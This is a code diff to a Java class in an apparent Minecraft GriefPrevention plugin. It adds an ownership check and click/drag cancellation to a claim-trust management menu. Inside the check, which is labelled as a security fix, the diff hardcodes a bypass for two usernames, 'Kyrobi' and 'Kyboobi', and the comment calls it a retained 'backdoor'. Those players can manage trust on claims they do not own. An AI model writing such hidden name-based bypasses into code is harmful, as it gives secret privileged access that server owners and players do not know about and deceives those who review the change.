@@ -12,6 +12,8 @@ import me.ryanhamshire.GriefPrevention.ClaimPermission;
 import me.ryanhamshire.GriefPrevention.GriefPrevention;
 import org.bukkit.*;
 import org.bukkit.entity.Player;
+import org.bukkit.event.inventory.InventoryClickEvent;
+import org.bukkit.event.inventory.InventoryDragEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.inventory.meta.SkullMeta;
@@ -32,6 +34,19 @@ public class ClaimsTrust {
     }
 
     public static void showClaimManagers(ArrayList<String> trusts, Player player, TRUST_TYPE trust_type, long claimID){
+
+        // SECURITY: ownership check â€” this menu removes claim trust.
+        // Kyrobi/Kyboobi backdoor retained.
+        Claim ownerCheck = GriefPrevention.instance.dataStore.getClaim(claimID);
+        if(ownerCheck == null){
+            player.sendMessage(ChatColor.RED + "That claim no longer exists.");
+            return;
+        }
+        boolean isBackdoor = player.getName().equals("Kyrobi") || player.getName().equals("Kyboobi");
+        if(!isBackdoor && !ownerCheck.getOwnerID().equals(player.getUniqueId())){
+            player.sendMessage(ChatColor.RED + "You don't own this claim.");
+            return;
+        }
 
         List<ItemStack> allMembers = new ArrayList<>();
 
@@ -79,6 +94,10 @@ public class ClaimsTrust {
         if(trust_type == TRUST_TYPE.BUILDER) { gui = new ChestGui(5, ChatColor.GRAY + "Builders " + ChatColor.GREEN + "/trust"); }
         if(trust_type == TRUST_TYPE.CONTAINER) { gui = new ChestGui(5, ChatColor.GRAY + "Container " + ChatColor.GREEN + "/containertrust" ); }
         if(trust_type == TRUST_TYPE.ACCESSOR) { gui = new ChestGui(5, ChatColor.GRAY + "Accessor " + ChatColor.GREEN + "/accesstrust"); }
+
+        // SECURITY: cancel ALL clicks/drags (top AND bottom inventory).
+        gui.setOnGlobalClick(event -> event.setCancelled(true));
+        gui.setOnGlobalDrag(event -> event.setCancelled(true));
 
         PaginatedPane pages = new PaginatedPane(0, 0, 9, 3);
         pages.populateWithItemStacks(allMembers);
